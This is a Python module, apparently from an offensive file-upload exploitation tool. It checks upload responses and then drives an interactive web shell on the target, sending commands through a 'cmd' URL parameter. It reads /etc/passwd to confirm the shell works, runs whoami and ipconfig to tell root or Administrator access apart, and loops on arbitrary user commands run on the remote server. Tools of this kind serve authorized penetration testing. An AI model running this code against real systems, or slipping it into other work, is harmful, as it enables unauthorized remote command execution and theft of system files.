#!/usr/bin/env python3

# This script contains functions for sending requests, interactive shell, and response checking.

# Import necessary modules
import urllib
from urllib.parse import urljoin, unquote
from .results_output import *
from . import alerts
from . import file_upload
from . import config
import base64
import re

def web_shell(options, headers, file_name, parameter_exists, operating_system):
    # Loop to run user commands on the target machine
    while True:
        try:
            if options.brute_force:
                alerts.warning("To exit interactive shell type exit, to continue the scan CTRL + C")
            else:
                alerts.warning("To exit interactive shell type exit or press CTRL + C")

            file_name = unquote(file_name)
            partial_url = urljoin(options.url, options.upload_dir)
            if operating_system == "Linux":
                if parameter_exists:
                    final_url = f"{partial_url}{file_name}&cmd=whoami"
                else:
                    final_url = f"{partial_url}{file_name}?cmd=whoami"

                response, final_url = file_upload.send_get_request(headers, options, final_url)    
                # Display # if the shell is accessed with the root user
                if 'root' in response.text:
                    command = input(f"\n{green}└─# {reset}")  # User input command to execute on the target machine
                # Display $ if the shell isn't accessed with the root user
                else:
                    command = input(f"\n{green}└─$ {reset}")  # User input command to execute on the target machine

            else:
                if parameter_exists:
                    final_url = f"{partial_url}{file_name}&cmd=whoami /groups"
                else:
                    final_url = f"{partial_url}{file_name}?cmd=whoami /groups" 

                response, final_url = file_upload.send_get_request(headers, options, final_url)
                # Display # if the shell is accessed with the root user
                if 'BUILTIN\Administrators' in response.text:
                    command = input(f"\n[Administrator] > ")  # User input command to execute on the target machine
                # Display $ if the shell isn't accessed with the root user
                else:
                    command = input(f"\n[User] > ")  # User input command to execute on the target machine

            cmd_encoded = urllib.parse.quote(command)  # Encode the user command

            if parameter_exists:
                final_url = f"{partial_url}{file_name}&cmd={cmd_encoded}"
            else:
                final_url = f"{partial_url}{file_name}?cmd={cmd_encoded}"

            # Split the URL to capture the user's command
            user_command = final_url.split("=")
            user_command = user_command[-1]

            if 'exit' in user_command.lower():
                exit(1)

            response, final_url = file_upload.send_get_request(headers, options, final_url)

            if "BEGIN:" in response.text:
                # Define the pattern for extracting text between "BEGIN:" and ":END"
                pattern = re.compile(r'BEGIN:(.*?)\:END', re.DOTALL)
                match = pattern.search(response.text)

                if match:
                    response_text = match.group(1).strip()  # strip() removes any extra whitespace

            print("")
            if "BEGIN:" in response.text:
                print(response_text)
            else:
                print(response.text.rstrip())

            if 'clear' in user_command.lower():
                print("\033c", end="")
            else:
                # Display the command executed and the response received
                alerts.info(f"URL: {final_url.lstrip()}")

        except KeyboardInterrupt:

            if not options.brute_force:
                # Handle keyboard interrupt exception if the user stops the script execution
                print("")
                alerts.error("Keyboard interrupt exception is caught!")
            else:
                break


# Function for interactive shell
def interactive_shell(options, headers, file_name, content_type, upload_dir, is_magic_bytes, allowed_extension,
                      current_time, response, user_options, skip_module, module, exploit_machine=None, filename_without_nullbyte=None):
    file_name_to_save_in_file = file_name.encode("latin-1")

    if not isinstance(is_magic_bytes, bool):
        is_magic_bytes = base64.b64encode(is_magic_bytes).decode('latin-1')

    if filename_without_nullbyte:
        file_name = filename_without_nullbyte

    if exploit_machine or options.upload_dir != 'optional' and options.exploitation and not skip_module:
        parameter_exists = False
        if options.upload_dir.endswith("=/"):
            options.upload_dir = options.upload_dir[:-1]
            parameter_exists = True

        if "?" in options.upload_dir:
            parameter_exists = True

        file_name = unquote(file_name)

        # Removing trailing extension
        if module in config.original_filenames:
            split_file_name = file_name.split(".", 1)
            tmp_file_name = split_file_name[0]
            file_name = tmp_file_name + "." + options.current_extension_tested

        partial_url = urljoin(options.url, options.upload_dir)

        if parameter_exists:
            final_url = f"{partial_url}{file_name}&cmd=cat /etc/passwd"
        else:
            final_url = f"{partial_url}{file_name}?cmd=cat /etc/passwd"

        response, final_url = file_upload.send_get_request(headers, options, final_url)

        # Validating the shell
        if 'root' in response.text:
            if isinstance(file_name, bytes):
                file_name = file_name.decode('latin-1')

            file_upload.printing(options, user_options, response, file_name, 100, current_time,
                                 options.current_module, is_magic_bytes, options.current_mimetype)

            alerts.warning("Interactive shell is activated, you can enter Linux system commands: ")
            results(options.url, file_name_to_save_in_file, content_type, upload_dir, is_magic_bytes,
                    options.output_dir, allowed_extension,
                    current_time, module)
            operating_system = "Linux"
            web_shell(options, headers, file_name, parameter_exists, operating_system)

        # Validating the shell
        if 'root' not in response.text:
            if parameter_exists:
                final_url = f"{partial_url}{file_name}&cmd=ipconfig"
            else:
                final_url = f"{partial_url}{file_name}?cmd=ipconfig"

            response, final_url = file_upload.send_get_request(headers, options, final_url)
            if 'Default Gateway' in response.text:
                if isinstance(file_name, bytes):
                    file_name = file_name.decode('latin-1')
                file_upload.printing(options, user_options, response, file_name, 100, current_time,
                                     options.current_module, is_magic_bytes, options.current_mimetype)
                alerts.warning("Interactive shell is activated, you can enter Windows system commands: ")
                results(options.url, file_name_to_save_in_file, content_type, upload_dir, is_magic_bytes,
                        options.output_dir, allowed_extension,
                        current_time, module)
                operating_system = "Windows"
                web_shell(options, headers, file_name, parameter_exists, operating_system)

    else:

        if options.upload_dir != 'optional' and not skip_module:

            if options.upload_dir.endswith("=/"):
                options.upload_dir = options.upload_dir[:-1]

            file_name_to_save_in_file = file_name.encode("latin-1")
            file_name = unquote(file_name)

            # Removing trailing extension
            if module in config.original_filenames:
                split_file_name = file_name.split(".", 1)
                tmp_file_name = split_file_name[0]
                file_name = tmp_file_name + "." + options.current_extension_tested

            partial_url = urljoin(options.url, options.upload_dir)
            final_url = f"{partial_url}{file_name}"

            response, final_url = file_upload.send_get_request(headers, options, final_url)
            file_data = open(f"assets/samples/sample.{options.file_extension}", 'r', encoding="latin-1")
            file_data = file_data.read()
            response_text = response.text
            if "BEGIN:" in response_text and file_data not in response_text:
                # Define the pattern for extracting text between "BEGIN:" and ":END"
                pattern = re.compile(r'BEGIN:(.*?)\:END', re.DOTALL)
                match = pattern.search(response_text)

                if match:
                    response_text = match.group(1).strip()  # strip() removes any extra whitespace

            if "Is this message being rendered?" in response_text and file_data not in response_text:
                success(
                    f"The sample file was executed and rendered successfully as {config.mimetypes[options.file_extension]}, congrats!")
                while True:
                    exploit_answer = input(
                        f"\n{blue}[i]{reset} Would you like to exploit the system and upload an interactive shell? y/n: ").lower()

                    if exploit_answer == "y" or exploit_answer == 'yes':

                        exploit_machine = True
                        return exploit_machine

                    elif exploit_answer == "n" or exploit_answer == 'no':
                        if not options.brute_force:
                            if isinstance(file_name, bytes):
                                file_name = file_name.decode('latin-1')
                            file_upload.printing(options, user_options, response, file_name, 100, current_time,
                                                 options.current_module,
                                                 is_magic_bytes, options.current_mimetype)
                            # Display upload successful message and location to access the file
                            alerts.success(f"File uploaded successfully with: {file_name}")
                            if not skip_module:
                                results(options.url, file_name_to_save_in_file, content_type, upload_dir,
                                        is_magic_bytes, options.output_dir, allowed_extension,
                                        current_time, module)
                                exit(1)
                        else:
                            return exploit_machine

                    else:
                        info("Choose either y or n!")

        else:

            file_name_to_save_in_file = file_name.encode('latin-1')

            if not options.brute_force:
                if isinstance(file_name, bytes):
                    file_name = file_name.decode('latin-1')
                file_upload.printing(options, user_options, response, file_name, 100, current_time,
                                     options.current_module,
                                     is_magic_bytes, options.current_mimetype)
                # Display upload successful message and location to access the file
                alerts.success(f"File uploaded successfully with: {file_name}")
                if not skip_module:
                    results(options.url, file_name_to_save_in_file, content_type, upload_dir, is_magic_bytes,
                            options.output_dir, allowed_extension,
                            current_time, module)
                    exit(1)
            else:
                results(options.url, file_name_to_save_in_file, content_type, upload_dir, is_magic_bytes,
                        options.output_dir, allowed_extension,
                        current_time, module)
                alerts.success(f"File uploaded successfully with: {file_name}")
                return exploit_machine


# Function for response checking
def response_check(options, headers, file_name, content_type, upload_dir, is_magic_bytes, allowed_extension,
                   current_time,
                   response, user_options, skip_module, module, filename_without_nullbyte=None):
    text_or_code = options.text_or_code
    response_status = ""
    exploit_machine = False
  
    if str(text_or_code).isdigit():

        # Check if response is match the status code in message
        if options.text_or_code == response.status_code:  # If status code is equals to the status code of the response
            response_status = "success"
            exploit_machine = interactive_shell(options, headers, file_name, content_type, upload_dir, is_magic_bytes,
                                                allowed_extension, current_time, response, user_options, skip_module,
                                                module, exploit_machine, filename_without_nullbyte)

        else:
            response_status = "fail"

    elif text_or_code == 'success_message':

        # Check if success_message in the response
        if options.upload_message in response.text:  # If success text is present in the response body
            response_status = "success"
            exploit_machine = interactive_shell(options, headers, file_name, content_type, upload_dir, is_magic_bytes,
                                                allowed_extension, current_time, response, user_options, skip_module,
                                                module, exploit_machine, filename_without_nullbyte)

        else:
            response_status = "fail"

    elif text_or_code == 'failure_message':

        # Check if failure message not in response
        if options.upload_message not in response.text:  # If success text is present in the response body
            response_status = "success"
            exploit_machine = interactive_shell(options, headers, file_name, content_type, upload_dir, is_magic_bytes,
                                                allowed_extension, current_time, response, user_options, skip_module,
                                                module, exploit_machine, filename_without_nullbyte)

        else:
            response_status = "fail"

    return response_status, exploit_machine
